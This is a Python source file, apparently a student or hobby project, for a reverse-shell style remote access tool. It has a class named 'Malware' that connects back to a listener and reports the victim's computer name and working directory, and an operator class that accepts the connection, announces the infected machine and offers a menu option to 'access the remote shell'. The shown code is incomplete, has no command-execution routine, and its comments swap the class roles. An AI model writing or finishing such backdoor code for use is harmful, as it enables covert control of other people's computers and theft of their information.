import socket, os, sys, time

"""
Classe contenant les variables communes entre client et serveur
"""


class Machine:
    def __init__(self):
        self.server_addr = ("localhost", 60000)
        self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.language = "utf-8"
        self.buffsize = 4096


"""
Classe contenant les fonctions pour le client
"""


class Malware(Machine):
    def __init__(self):
        super().__init__()

    def start(self):
        try:
            self.my_socket.connect(self.server_addr)
            self.send(os.environ["COMPUTERNAME"])
            time.sleep(1)
            self.send(os.getcwd() + "> ")
        except socket.error:
            self.start()

    def send(self, message):
        self.my_socket.send(str(message).encode(self.language))

    def receive(self):
        cmd = self.my_socket.recv(self.buffsize).decode(self.language)
        return cmd

    def quit(self):
        try:
            self.my_socket.close()
        except:
            print("Nous avons quitter avec une erreur")

    def get_socket(self):
        return self.my_socket
"""
Classe contenant les fonction pour le malware
"""


class Client(Machine):
    def __init__(self):
        super().__init__()

    def start(self):
        self.my_socket.bind(self.server_addr)
        self.my_socket.listen()

    def bind(self):
        global distant_socket, addr, hostname
        distant_socket, addr = self.my_socket.accept()
        print("Connection accepted for :", addr)
        hostname = distant_socket.recv(self.buffsize).decode(self.language)
        print("The malware has infected the machine named " + str(hostname) + "\n")
        choix = self.menu()
        return choix

    def menu(self):
        print("╔═════════════════════════════════════════════════════════╗")
        print("  |\  /|   /\   | |\  |   |\  /| |¯¯¯ |\  | |   |")
        print("  | \/ |  /__\  | | \ |   | \/ | |--  | \ | |   |")
        print("  |    | /    \ | |  \|   |    | |___ |  \| |___|")
        print("═════════════════════════════════════════════════════════╗")
        print("Press 1 to access the remote shell")
        print("Press 2 to get informations")
        choix = input()
        return choix

    def send(self, commande):
        distant_socket.send(commande.encode(self.language))

    def receive(self):
        rep = distant_socket.recv(self.buffsize)
        rep = rep.decode(self.language)
        print(rep, end="")

    def quit(self):
        print("Shutting down in 10 seconds")
        time.sleep(10)
        distant_socket.close()
        self.my_socket.close()
        sys.exit()
